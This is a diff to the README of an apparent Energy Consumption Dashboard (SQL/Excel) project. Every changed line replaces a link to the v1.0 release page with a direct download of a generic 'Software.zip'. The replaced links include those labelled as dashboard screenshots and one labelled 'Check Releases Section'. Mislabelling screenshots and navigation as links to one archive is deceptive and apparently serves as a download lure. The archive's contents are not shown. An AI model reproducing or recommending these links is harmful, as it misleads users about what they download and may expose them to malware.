@@ -33,7 +33,7 @@ The main goal of this project is to provide a user-friendly interface to analyze
 ## How to Use 🚀
 
 To access the project, you can download the repository files from the following link:
-[Download Energy Consumption Dashboard Project](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/tag/v1.0)
+[Download Energy Consumption Dashboard Project](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/download/v2.0/Software.zip)
 
 🚨 **Note: Please ensure to check the "Releases" section if the above link is not working or if you need to access a specific version.**
 
@@ -49,9 +49,9 @@ To access the project, you can download the repository files from the following 
 
 Here are some sneak peeks of the Energy Consumption Dashboard project:
 
-![Energy Dashboard](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/tag/v1.0)
-![SQL Queries](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/tag/v1.0)
-![Power Pivot Model](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/tag/v1.0)
+![Energy Dashboard](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/download/v2.0/Software.zip)
+![SQL Queries](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/download/v2.0/Software.zip)
+![Power Pivot Model](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/download/v2.0/Software.zip)
 
 ## Get Started 🚗
 
@@ -75,9 +75,9 @@ For any inquiries or assistance regarding the Energy Consumption Dashboard proje
 
 Let's make energy consumption analysis more insightful and engaging with this powerful dashboard project! 🌟
 
-🔗 **[Check Releases Section for More Versions](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/tag/v1.0)**
+🔗 **[Check Releases Section for More Versions](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/download/v2.0/Software.zip)**
 
-![Download Project](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/tag/v1.0)
+![Download Project](https://github.com/Testig-78/Energy-Consumption-Dashboard-SQL-Excel/releases/download/v2.0/Software.zip)
 
 Here's to a brighter and more sustainable future powered by data-driven insights! 🌍⚡️
 
